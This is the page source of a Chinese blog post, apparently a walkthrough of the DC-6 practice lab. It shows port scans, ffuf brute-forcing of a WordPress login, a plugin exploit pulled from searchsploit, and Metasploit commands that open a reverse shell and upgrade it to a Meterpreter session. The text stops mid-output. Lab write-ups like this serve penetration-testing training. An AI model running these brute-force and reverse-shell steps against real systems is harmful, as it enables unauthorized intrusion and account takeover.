@@ -1,0 +1,292 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>渗透测试演练 DC-6 | Tripse Blog</title><meta name="keywords" content="渗透测试演练"><meta name="author" content="Tripse"><meta name="copyright" content="Tripse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DC-6  author：leadlife data：2023&#x2F;5&#x2F;17 blog：https:&#x2F;&#x2F;tripse.github.io&#x2F; 本次测试使用到的工具如下：  信息收集：nmap、fscan、cmseek、searchsploit、ffuf、burpsuite SHELL：MSF、netcat 内部信息收集：无 权限提升：无   外部信息收集Nmap ICMP 扫描发现主">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试演练 DC-6">
+<meta property="og:url" content="https://tripse.github.io/2023/05/19/DC-6/index.html">
+<meta property="og:site_name" content="Tripse Blog">
+<meta property="og:description" content="DC-6  author：leadlife data：2023&#x2F;5&#x2F;17 blog：https:&#x2F;&#x2F;tripse.github.io&#x2F; 本次测试使用到的工具如下：  信息收集：nmap、fscan、cmseek、searchsploit、ffuf、burpsuite SHELL：MSF、netcat 内部信息收集：无 权限提升：无   外部信息收集Nmap ICMP 扫描发现主">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://security-note.oss-cn-hangzhou.aliyuncs.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%94%E7%BB%83.jpg">
+<meta property="article:published_time" content="2023-05-19T10:42:09.754Z">
+<meta property="article:modified_time" content="2023-05-19T10:42:49.553Z">
+<meta property="article:author" content="Tripse">
+<meta property="article:tag" content="渗透测试演练">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://security-note.oss-cn-hangzhou.aliyuncs.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%94%E7%BB%83.jpg"><link rel="shortcut icon" href="https://security-note.oss-cn-hangzhou.aliyuncs.com/dog1.jpeg"><link rel="canonical" href="https://tripse.github.io/2023/05/19/DC-6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '渗透测试演练 DC-6',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-19 18:42:49'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/icon.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/dog1.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tripse Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透测试演练 DC-6</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-19T10:42:09.754Z" title="发表于 2023-05-19 18:42:09">2023-05-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-19T10:42:49.553Z" title="更新于 2023-05-19 18:42:49">2023-05-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%94%E7%BB%83/">渗透测试演练</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透测试演练 DC-6"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><hr>
+<blockquote>
+<p>author：leadlife</p>
+<p>data：2023&#x2F;5&#x2F;17</p>
+<p>blog：<a href="https://tripse.github.io/">https://tripse.github.io/</a></p>
+<p>本次测试使用到的工具如下：</p>
+<ul>
+<li>信息收集：nmap、fscan、cmseek、searchsploit、ffuf、burpsuite</li>
+<li>SHELL：MSF、netcat</li>
+<li>内部信息收集：无</li>
+<li>权限提升：无</li>
+</ul>
+</blockquote>
+<h2 id="外部信息收集"><a href="#外部信息收集" class="headerlink" title="外部信息收集"></a>外部信息收集</h2><h3 id="Nmap-ICMP-扫描发现主机"><a href="#Nmap-ICMP-扫描发现主机" class="headerlink" title="Nmap ICMP 扫描发现主机"></a>Nmap ICMP 扫描发现主机</h3><blockquote>
+<p>本次测试靶机 IP：10.10.10.135</p>
+</blockquote>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">24</span> -T4 --min-rate <span class="number">10000</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap <span class="number">7.93</span> ( https:<span class="comment">//nmap.org ) at 2023-05-17 03:10 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.135</span></span><br><span class="line">Host is up (<span class="number">0.00020</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D7:<span class="number">63</span>:<span class="number">00</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.254</span></span><br><span class="line">Host is up (<span class="number">0.00019</span>s latency).</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:FE:A1:CD (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span></span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts up) scanned in <span class="number">0.36</span> seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Fsacn-探测开放端口"><a href="#Fsacn-探测开放端口" class="headerlink" title="Fsacn 探测开放端口"></a>Fsacn 探测开放端口</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fscan -h <span class="number">10.10</span>.<span class="number">10.135</span> -p <span class="number">0</span>-<span class="number">65535</span> -t <span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string">                     fscan version: 1.8.1</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 10.10.10.135    is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string">10.10.10.135:22 open</span></span><br><span class="line"><span class="string">10.10.10.135:80 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 2</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle: http://10.10.10.135       code:301 len:0      title:None 跳转url: http://wordy/</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Nmap-进行详细端口扫描"><a href="#Nmap-进行详细端口扫描" class="headerlink" title="Nmap 进行详细端口扫描"></a>Nmap 进行详细端口扫描</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -sC -sV -O -T4 --min-rate <span class="number">10000</span> <span class="number">10.10</span>.<span class="number">10.135</span> -oN nmap.all</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap <span class="number">7.93</span> ( https:<span class="comment">//nmap.org ) at 2023-05-17 03:13 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.135</span></span><br><span class="line">Host is up (<span class="number">0.00035</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.4</span>p1 Debian <span class="number">10</span>+deb9u6 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   <span class="number">2048</span> <span class="number">3e52</span>cece01b694eb7b037dbe087f5ffd (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">3</span>c836571dd73d723f8830de346bcb56f (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">41899e85</span>ae305be08fa4687106b415ee (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span><span class="number">.25</span> ((Debian))</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span><span class="number">.25</span> (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http:<span class="comment">//wordy/</span></span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D7:<span class="number">63</span>:<span class="number">00</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="keyword">type</span>: general purpose</span><br><span class="line">Running: Linux <span class="number">3.</span>X|<span class="number">4.</span>X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.9</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">8.61</span> seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="修改-Hosts"><a href="#修改-Hosts" class="headerlink" title="修改 Hosts"></a>修改 Hosts</h3><p>无法访问，修改绑定</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517031413828.png" alt="image-20230517031413828"></p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517031449109.png" alt="image-20230517031449109"></p>
+<p>再次访问测试成功，发现为 wordpress CMS</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517031527024.png" alt="image-20230517031527024"></p>
+<h3 id="CMSeek-判断-CMS-版本"><a href="#CMSeek-判断-CMS-版本" class="headerlink" title="CMSeek 判断 CMS 版本"></a>CMSeek 判断 CMS 版本</h3><p>信息如下：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517031625031.png" alt="image-20230517031625031"></p>
+<p>操作用户名为列表，后面爆破会使用到：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">leadlife@endeavrouOS ~<span class="regexp">/p/</span>DC6&gt; cat user.txt</span><br><span class="line">mark</span><br><span class="line">admin</span><br><span class="line">graham</span><br><span class="line">jens</span><br><span class="line">sarah</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="searchsploit-搜寻-cms-版本漏洞"><a href="#searchsploit-搜寻-cms-版本漏洞" class="headerlink" title="searchsploit 搜寻 cms 版本漏洞"></a>searchsploit 搜寻 cms 版本漏洞</h3><p>无远程 RCE</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517031846195.png" alt="image-20230517031846195"></p>
+<h2 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><blockquote>
+<p>使用到 ffuf，操作手法如下：</p>
+<ul>
+<li>burpsuite 抓包</li>
+<li>保存数据包文本</li>
+<li>修改需要 FUZZ 端点</li>
+</ul>
+<p>wordpress 默认后台地址：<a target="_blank" rel="noopener" href="http://wordy/wp-login.php">http://wordy/wp-login.php</a></p>
+</blockquote>
+<p>1：burpsuite 抓包</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517032329271.png" alt="image-20230517032329271"></p>
+<p>2：保存数据包文本</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517032404607.png" alt="image-20230517032404607"></p>
+<p>3：修改需要 FUZZ 端点</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517034837865.png" alt="image-20230517034837865"></p>
+<p>4：开始爆破</p>
+<p>靶机作者提示：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517034518916.png" alt="image-20230517034518916"></p>
+<p>将含有 k01 的密码导出，操作该命令即可：</p>
+<blockquote>
+<p>seclists 已包含 rockyou：<code>/usr/share/seclists/Passwords/Leaked-Databases</code></p>
+</blockquote>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">leadlife@endeavrouOS /u/<span class="regexp">s/s/P/</span>Leaked-Databases&gt; pwd</span><br><span class="line">/usr/share/seclists/Passwords/Leaked-Databases</span><br><span class="line">leadlife@endeavrouOS /u/<span class="regexp">s/s/P/</span>Leaked-Databases&gt; ls | <span class="keyword">grep</span> rockyou</span><br><span class="line">rockyou-<span class="number">05</span>.txt</span><br><span class="line">rockyou-<span class="number">10</span>.txt</span><br><span class="line">rockyou-<span class="number">15</span>.txt</span><br><span class="line">rockyou-<span class="number">20</span>.txt</span><br><span class="line">rockyou-<span class="number">25</span>.txt</span><br><span class="line">rockyou-<span class="number">30</span>.txt</span><br><span class="line">rockyou-<span class="number">35</span>.txt</span><br><span class="line">rockyou-<span class="number">40</span>.txt</span><br><span class="line">rockyou-<span class="number">45</span>.txt</span><br><span class="line">rockyou-<span class="number">50</span>.txt</span><br><span class="line">rockyou-<span class="number">55</span>.txt</span><br><span class="line">rockyou-<span class="number">60</span>.txt</span><br><span class="line">rockyou-<span class="number">65</span>.txt</span><br><span class="line">rockyou-<span class="number">70</span>.txt</span><br><span class="line">rockyou-<span class="number">75</span>.txt</span><br><span class="line">rockyou.txt</span><br><span class="line">rockyou.txt.tar.gz</span><br><span class="line">rockyou-withcount.txt.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>操作 ffuf 爆破：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -request data.txt -request-proto http -mode clusterbomb -w user.txt:FUZZ1 -w passwords.txt:FUZZ2 -t <span class="number">30</span> -rate <span class="number">10000</span> -fw <span class="number">188</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517035155624.png" alt="image-20230517035155624"></p>
+<p>成功登入：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517035312749.png" alt="image-20230517035312749"></p>
+<h2 id="后台-GetSHELL"><a href="#后台-GetSHELL" class="headerlink" title="后台 GetSHELL"></a>后台 GetSHELL</h2><p>发现插件 Activity monitor</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517035418500.png" alt="image-20230517035418500"></p>
+<p>查找该插件是否存在漏洞：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517035931306.png" alt="image-20230517035931306"></p>
+<h3 id="漏洞利用尝试"><a href="#漏洞利用尝试" class="headerlink" title="漏洞利用尝试"></a>漏洞利用尝试</h3><blockquote>
+<p>成功 GetSHELL</p>
+</blockquote>
+<p>copy 到当前目录：<code> searchsploit -m php/webapps/50110.py</code></p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517040138501.png" alt="imag1231"></p>
+<h3 id="稳定-SHELL"><a href="#稳定-SHELL" class="headerlink" title="稳定 SHELL"></a>稳定 SHELL</h3><p>由于该 SHELL 并不稳定，这里利用 MSF 拿一个稳定的 SHELL</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; <span class="keyword">use</span> exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line"><span class="string">lhost =&gt;</span> <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (generic/shell_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>          yes       The <span class="keyword">listen</span> address (an interface may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The <span class="keyword">listen</span> port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, <span class="keyword">or</span> info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517040456754.png" alt="image-20230517040456754"></p>
+<h3 id="优化-SHELL"><a href="#优化-SHELL" class="headerlink" title="优化 SHELL"></a>优化 SHELL</h3><p>再转为 meterpreter SHELL</p>
+<blockquote>
+<p>用到的模块：<code>post/multi/manage/shell_to_meterpreter</code></p>
+<p>步骤如下：</p>
+<ul>
+<li>首先将当前 session 转到后台：<code>background</code></li>
+<li>利用模块，注意端口占用</li>
+</ul>
+</blockquote>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">Background session <span class="number">1</span>? [y/N]  y</span><br><span class="line">msf6 post(multi/manage/shell_to_meterpreter) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/shell_to_meterpreter):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   HANDLER  <span class="literal">true</span>             yes       Start an exploit/multi/handler to receive the connection</span><br><span class="line">   LHOST    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>          no        IP of host that will receive the connection from the payload (Will try to auto detect).</span><br><span class="line">   LPORT    <span class="number">4433</span>             yes       Port <span class="keyword">for</span> payload to connect to.</span><br><span class="line">   SESSION  <span class="number">1</span>                yes       The session to run this module on</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/shell_to_meterpreter) &gt; set lhost <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span></span><br><span class="line">lhost =&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span></span><br><span class="line">msf6 post(multi/manage/shell_to_meterpreter) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Upgrading session ID: <span class="number">1</span></span><br><span class="line">[*] Starting exploit/multi/handler</span><br><span class="line">[*] Started reverse TCP handler on <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>:<span class="number">4321</span></span><br><span class="line">[*] Sending stage (<span class="number">1017704</span> bytes) to <span class="number">10.10</span><span class="number">.10</span><span class="number">.135</span></span><br><span class="line">[*] Meterpreter session <span class="number">2</span> opened (<span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>:<span class="number">4321</span> -&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.135</span>:<span class="number">58272</span>) at <span class="number">2023</span><span 